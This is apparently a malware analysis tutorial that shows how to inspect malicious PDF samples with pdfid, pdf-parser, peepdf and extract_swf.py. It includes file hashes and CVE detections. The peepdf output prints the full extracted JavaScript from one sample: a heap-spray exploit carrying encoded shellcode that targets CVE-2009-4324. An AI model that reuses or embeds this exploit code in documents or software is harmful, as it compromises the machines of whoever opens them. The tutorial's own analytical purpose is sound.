# PDF malware analysis

Malicious documents which have obfuscated malicious script/marco are used by phishing emails in APT attack.

This document will introduce document type malware analysis tools with malicious sample files.

In this time, we will only talk about PDF document analysis technique and how to extract malicious scripts from the malicious PDF files, but not about script/macro deobfuscation techniques. 

I am going to explain deobfuscation and shellcode analysis in further documents as they require different skills.


## Identification of PDF document

The structure of PDF file is consist of various types of objects and they are connected like a tree. 

Identification of PDF structure helps us immediately figure out whether the target PDF has malicious contents or not.

For example, objects in PDF structure are impledmented through a plain text. So, if a malicious URL is embedded on a PDF file, the malicious URL can be detected through "strings" command.

Following 3 tools provide structured result to identify PDF documents.


### pdfid.py

pdfid is a simple script to show PDF structure. As below, msf.pdf has /JS and /JavaScript objects are commonly used by malware s. 

- Download : https://github.com/DidierStevens/DidierStevensSuite

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python pdfid.py ../_sample/pdf/msf.pdf 
PDFiD 0.2.4 ../_sample/pdf/msf.pdf
 PDF Header: %PDF-1.5
 obj                    6
 endobj                 6
 stream                 1
 endstream              1
 xref                   1
 trailer                1
 startxref              1
 /Page                  1(1)
 /Encrypt               0
 /ObjStm                0
 /JS                    1(1)
 /JavaScript            1(1)
 /AA                    0
 /OpenAction            1(1)
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /URI                   0
 /Colors > 2^24         0
```

### pdf-parser.py

By running just pdf-parser without any option, you can get brief information of the PDF structure. 

- Download : https://github.com/DidierStevens/DidierStevensSuite

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python pdf-parser.py ../_sample/pdf/msf.pdf 
PDF Comment '%PDF-1.5\n'

PDF Comment '%\xc0\xff\xee\xfa\xba\xda\n'

obj 1 0
 Type: /Catalog
 Referencing: 3 0 R, 5 0 R, 2 0 R

  <<
    /Type /Catalog
    /Pages 3 0 R
    /OpenAction 5 0 R
    /Outlines 2 0 R
  >>


obj 2 0
 Type: /Outlines
 Referencing: 

  <<
    /Type /Outlines
    /Count 0
  >>


obj 3 0
 Type: /Pages
 Referencing: 4 0 R

  <<
    /Kids [ 4 0 R ]
    /Type /Pages
    /Count 1
  >>


obj 4 0
 Type: /Page
 Referencing: 3 0 R

  <<
    /Parent 3 0 R
    /Type /Page
    /MediaBox [ 0 0 612 792 ]
  >>


obj 5 0
 Type: /Action
 Referencing: 6 0 R

  <<
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  >>


obj 6 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Length 2471
    /Filter [ /#46#6ca#74#65#44ec#6fd#65 /A#53#43#49#49#48#65#78#44e#63#6f#64e ]
  >>


xref

trailer
  <<
    /Size 7
    /Root 1 0 R
  >>

startxref 3054

PDF Comment '%%EOF\n'
```

### peepdf.py

peepdf is one of the strongest tools to analyze PDF malware. It provides a lot of information including hash, object number and even CVE code. 

In an example below, it shows Javascript is located in object 6.

- Download : https://github.com/jesparza/peepdf
- Reference : https://www.blackhat.com/docs/eu-15/materials/eu-15-Esparza-peepdf.pdf

```
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ python peepdf.py ../_sample/pdf/msf.pdf 
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!
Warning: Python Imaging Library (PIL) is not installed!!

File: msf.pdf
MD5: 46982f7141423ab624e9673835b590e9
SHA1: ac38dca1b13f4116418a7b239f09a1f401e7498f
SHA256: e9cfb36ed30a4e93b0bc6358db1793ebad3390878db382dc06848fbc9a76e0e7
Size: 3270 bytes
Version: 1.5
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 6
Streams: 1
URIs: 0
Comments: 0
Errors: 0

Version 0:
	Catalog: 1
	Info: No
	Objects (6): [1, 2, 3, 4, 5, 6]
	Streams (1): [6]
		Encoded (1): [6]
	Objects with JS code (1): [6]
	Suspicious elements:
		/OpenAction (1): [1]
		/JS (1): [5]
		/JavaScript (1): [5]
		media.newPlayer (CVE-2009-4324) (1): [6]
```

## The extraction of malicious Javascript from PDF malware

As mentioned above, we learned a malicious sample PDF file "msf.pdf" has Javascript code. 

peepdf can be used to extract Javascript from the PDF file.

Option "i" in peepdf script let you enter into interactive shell mode

```
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ python peepdf.py -i
PPDF> help

Documented commands (type help <topic>):
========================================
bytes           exit         js_jjdecode       open          search    
changelog       extract      js_join           quit          set       
create          filters      js_unescape       rawobject     show      
decode          hash         js_vars           rawstream     stream    
decrypt         help         log               references    tree      
embed           info         malformed_output  replace       vtcheck   
encode          js_analyse   metadata          reset         xor       
encode_strings  js_beautify  modify            save          xor_search
encrypt         js_code      object            save_version
errors          js_eval      offsets           sctest      
```

Once the PDF file is opened through open command, it shows PDF structure. 

```
PPDF> open ../_sample/pdf/msf.pdf

File opened succesfully!!

Warning: PyV8 is not installed!!


File: msf.pdf
MD5: 46982f7141423ab624e9673835b590e9
SHA1: ac38dca1b13f4116418a7b239f09a1f401e7498f
Size: 3270 bytes
Version: 1.5
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 6
Streams: 1
URIs: 0
Comments: 0
Errors: 0

Version 0:
	Catalog: 1
	Info: No
	Objects (6): [1, 2, 3, 4, 5, 6]
	Streams (1): [6]
		Encoded (1): [6]
	Objects with JS code (1): [6]
	Suspicious elements:
		/OpenAction (1): [1]
		/JS (1): [5]
		/JavaScript (1): [5]
		media.newPlayer (CVE-2009-4324) (1): [6]
```

According to the PDF structure, object 6 has Javascript code. We can export Javascript code after entering object command with object number. 

```
PPDF> object 6

<< /Length 2471
/Filter [ /FlateDecode /ASCIIHexDecode ] >>
stream

var LjjCdCEXusCTIUfDyxKcDuHDwZPVUFHPKaGDAEznNSkxNNwyDQrjHRlpqbdAvfLGiyIbbvHllEnIip = unescape("%uc3db%u74d9%uf424%u2fba%u40e4%u58c6%uc933%u54b1%ue883%u31fc%u1450%u5003%u063b%u3ab5%u44ab%uc336%u292b%u26be%u691a%u23a4%u590c%u66ae%u12a0%u92e2%u5633%u942b%uddf4%u9b0d%u4d05%uba6d%u8c85%u1ca2%u5eb4%u5db7%u83f1%u0f3a%uc8aa%ua0e9%u85df%u4a31%u0893%uaf32%u2a63%u7e13%u75f8%u80b3%u0e2d%u9afa%u2b32%u11b4%uc780%uf047%u28d9%u3deb%udad6%u7af5%u04d0%u7280%ub823%u4093%u665e%u5311%uedf8%ubf81%u22f9%u4b57%u8ff5%u1313%u1119%u2ff7%u9a25%ufff6%ud8ac%udbdc%ubbf5%u7d7d%u6d53%u9d81%ud23c%ud527%u07d0%ub45a%ue4bc%u4757%u633c%u34ef%u2c0e%ud35b%ua522%u2445%u9c45%uba32%u1fb8%u9243%u4b7e%u8c13%uf457%u4cf8%u2158%u4994%u66ce%u5278%u1f0f%u5279%u831e%ub4f4%u6b70%u6957%udb30%ud917%u31d8%u0698%u39f8%u2f72%ud592%u072b%u4f0a%ud376%u90ab%u99ac%u1beb%u5d45%ueba5%u4d2c%u8dd1%u8dce%u2421%ue7cf%uee25%u9f98%ud727%u3fef%u32d8%u476c%uc326%u3345%u5110%u2bea%ub55c%uabea%udf0a%uc3ea%ubbea%uf6b8%u11f5%uaaad%u9a63%u1f84%uf224%u792a%u5d02%uacd4%u9a11%u322a%u0337%ucc43%ub377%ua693%ue377%u3dfb%u0c58%ubecc%u4573%u3444%u2715%u49f5%ue93c%u4aab%u32b2%uc4bd%uc535%u26c2%u130a%u5cfb%ua74b%u6fb8%u8ae6%ue5e9%u9808%u2fea");
var tkxiIAEAiwbJLZsnNrGI = unescape("%u0c0c%u0c0c");
var lYdYbhAuGPoow = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u4763%u6c43%u4e4e%u735c%u485c%u6770%u4f41%u4c61%u5c61%u774d%u4d5c%u685c%u5446%u4762%u735c%u4743%u5c5a%u5648%u556b%u6271%u5c71%u626d%u4b52%u5c66%u5c68%u6579%u5645%u5c50%u546a%u6741%u5a6c%u485c%u5677%u5c66%u4168");

while(tkxiIAEAiwbJLZsnNrGI.length <= 32768) tkxiIAEAiwbJLZsnNrGI+=tkxiIAEAiwbJLZsnNrGI;
  tkxiIAEAiwbJLZsnNrGI=tkxiIAEAiwbJLZsnNrGI.substring(0,32768 - LjjCdCEXusCTIUfDyxKcDuHDwZPVUFHPKaGDAEznNSkxNNwyDQrjHRlpqbdAvfLGiyIbbvHllEnIip.length);

memory=new Array();

for(i=0;i<0x2000;i++) {
  memory[i]= tkxiIAEAiwbJLZsnNrGI + LjjCdCEXusCTIUfDyxKcDuHDwZPVUFHPKaGDAEznNSkxNNwyDQrjHRlpqbdAvfLGiyIbbvHllEnIip;
}

util.printd("Dnz\jKISPP\tcbVI\yqDk\MCK\hebZUfnnGAkfpEA", new Date());
util.printd("ewplP\daZa\jCTpxpewTKnFoJwC\H\H\Hn\hu\hKFOV", new Date());
try {this.media.newPlayer(null);} catch(e) {}
util.printd(lYdYbhAuGPoow, new Date());

endstream
```

## The extraction of malicious flash file from PDF malware

Here is another malicious sample PDF file "file.pdf" which has a malicious swf file. Javascript as well as the action script of flash file is commonly used by malicious PDF files. 

extract_swf.py script will be used this time. It litterally supports SWF file extraction. 

- Download : https://gist.github.com/noonat/821548


Before using the extract_swf.py, let's verify the sample PDF file with peepdf.py if it has flash script.
```
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ python peepdf.py ../_sample/pdf/file.pdf 

Please, don't forget to report the errors found:

	- Sending the file "/Users/eloi/Desktop/Tools/Malware/peepdf/errors.txt" to the author (mailto:peepdfREMOVETHIS@eternal-todo.com)
	- And/Or creating an issue on the project webpage (https://github.com/jesparza/peepdf/issues)
```

An error is caused on the peepdf.py because sometime malware has abnormal file structure.

```
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ file ../_sample/pdf/file.pdf 
../_sample/pdf/file.pdf: POSIX tar archive (GNU)
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ file ../_sample/pdf/msf.pdf 
../_sample/pdf/msf.pdf: PDF document, version 1.5
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ head ../_sample/pdf/file.pdf 
PDFsample/Malware1.pdf0000644000175000017500000010134413014503526014455 0ustar  remnuxremnux%PDF-1.5
1 0 obj
<</T#79pe/#43a#74#61#6co#67/P#61#67#65#73 3 0 R/O#70#65n#41c#74i#6f#6e 5 0 R>>
endobj
3 0 obj
<</T#79pe/Pag#65#73/#43#6fu#6et 1/Ki#64#73 [4 0 R]>>
endobj
4 0 obj
<</#54#79#70e/P#61g#65/#50a#72e#6e#74 3 0 R/#41#6enots [7 0 R] >>
endobj
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ head ../_sample/pdf/msf.pdf 
%PDF-1.5
%??????
1 0 obj
<< /T#79#70#65 /#43a#74alo#67
/#50#61#67es 3 0 R
/Open#41c#74ion 5 0 R
/#4fut#6cines 2 0 R >>
endobj

2 0 obj
```

Even if the sample malware has abnormal structure, it can be opened by forcing the "f" option. There are /Flash objects in the PDF malware.  

```
eloi@Null2Root:~/Desktop/Tools/Malware/peepdf$ python peepdf.py ../_sample/pdf/file.pdf -f
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!
Warning: Python Imaging Library (PIL) is not installed!!

File: file.pdf
MD5: b1dba17e17ef75dc354e5a46fee5f136
SHA1: 75ea4fc535dd925eda846c13a6cd13d95f9b3a11
SHA256: 446a9d2a6649816a64790f649312f6fff9edb858aac1d3d31046ee1b6e210384
Size: 225280 bytes
Version: 1.5
Binary: False
Linearized: False
Encrypted: False
Updates: 6
Objects: 76
Streams: 16
URIs: 0
Comments: 0
Errors: 1

Version 0:
	Catalog: 1
	Info: No
	Objects (15): [1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]
	Streams (2): [6, 16]
		Encoded (1): [6]
	Objects with JS code (1): [6]
	Suspicious elements:
		/OpenAction (1): [1]
		/Names (1): [12]
		/JS (1): [5]
		/JavaScript (1): [5]
		/Flash: [8, 14, 15]
		/EmbeddedFile: [16]


Version 1:
	Catalog: 1
	Info: No
	Objects (6): [1, 2, 3, 4, 5, 6]
	Streams (1): [6]
		Encoded (1): [6]
	Objects with JS code (1): [6]
	Suspicious elements:
		/OpenAction (1): [1]
		/JS (1): [5]
		/JavaScript (1): [5]
		media.newPlayer (CVE-2009-4324) (1): [6]


Version 2:
	Catalog: 1
	Info: No
	Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
	Streams (2): [5, 8]
		Encoded (1): [8]
	Objects with JS code (1): [9]
	Suspicious elements:
		/OpenAction (1): [1]
		/Names (1): [1]
		/JS (1): [9]
		/JavaScript (1): [9]
		/EmbeddedFiles: [1]
		/EmbeddedFile: [8]


Version 3:
	Catalog: 1
	Info: 9
	Objects (23): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23]
	Compressed objects (8): [10, 11, 12, 13, 14, 15, 16, 17]
	Streams (5): [4, 18, 20, 21, 23]
		Xref streams (1): [23]
		Object streams (1): [18]
		Encoded (4): [4, 18, 20, 23]

Version 4:
	Catalog: 1
	Info: 9
	Objects (0): []
	Streams (0): []

Version 5:
	Catalog: 1
	Info: No
	Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
	Streams (2): [5, 8]
		Encoded (1): [8]
	Objects with JS code (1): [9]
	Suspicious elements:
		/AcroForm (1): [8]
		/OpenAction (2): [1, 8]
		/Names (1): [1]
		/XFA (1): [8]
		/JS (2): [8, 9]
		/JavaScript (2): [8, 9]
		/EmbeddedFiles: [1]
		/EmbeddedFile: [8]


Version 6:
	Catalog: 1
	Info: No
	Objects (14): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
		Errors (1): [12]
	Streams (4): [8, 10, 12, 14]
		Encoded (1): [10]
	Objects with JS code (1): [12]
	Suspicious elements:
		/AcroForm (1): [1]
		/OpenAction (1): [1]
		/XFA (1): [13]
		/JS (1): [11]
		/JavaScript (1): [11]
		CoolType.SING.uniqueName (CVE-2010-2883): [10]




Please, don't forget to report the errors found:

	- Sending the file "/Users/eloi/Desktop/Tools/Malware/peepdf/errors.txt" to the author (mailto:peepdfREMOVETHIS@eternal-todo.com)
	- And/Or creating an issue on the project webpage (https://github.com/jesparza/peepdf/issues)
```

We can extract the swf file by simply putting the file name into the parameter.

```
eloi@Null2Root:~/Desktop/Tools/Malware$ python extract_swf.py _sample/pdf/file.pdf 
reading '_sample/pdf/file.pdf'
found a valid header:
  id: CWS
  version: 9
  length: 52647
  decompressing...  ok.
  wrote swf to out001.swf.
eloi@Null2Root:~/Desktop/Tools/Malware$ file out001.swf 
out001.swf: Macromedia Flash data, version 9
eloi@Null2Root:~/Desktop/Tools/Malware$ md5 out001.swf 
MD5 (out001.swf) = d1c659dbfa96c4b68589babe1f7c38a5
```

The swf has a bad reputation on Virus Total.


<img width="1007" alt="screen shot 2018-07-28 at 10 30 26 pm" src="https://user-images.githubusercontent.com/14992494/43357566-42db3cea-92b6-11e8-92cf-d22dc11a7e23.png">
